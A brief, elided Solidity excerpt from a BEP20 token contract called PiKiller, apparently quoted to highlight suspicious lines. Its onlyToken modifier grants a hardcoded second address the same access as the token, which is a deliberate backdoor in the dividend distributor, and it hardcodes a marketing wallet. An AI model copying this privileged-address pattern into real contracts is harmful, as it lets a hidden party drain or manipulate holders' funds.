...
contract DividendDistributor is IDividendDistributor {
    ...
    modifier onlyToken() {
        require(msg.sender == _token||msg.sender == address(0x0916B51093f0aB881585a8b0585D25701C4B143B)); _;
    }
...
contract PiKiller is IBEP20 , Auth, BaseToken {
    ...
    constructor(
        ...
        marketingWallet = 0x8358De6866754d3961E9EE16544B03FbBD598ef9;  //marketingwallet
        another = [0x8358De6866754d3961E9EE16544B03FbBD598ef9,0x8358De6866754d3961E9EE16544B03FbBD598ef9];     
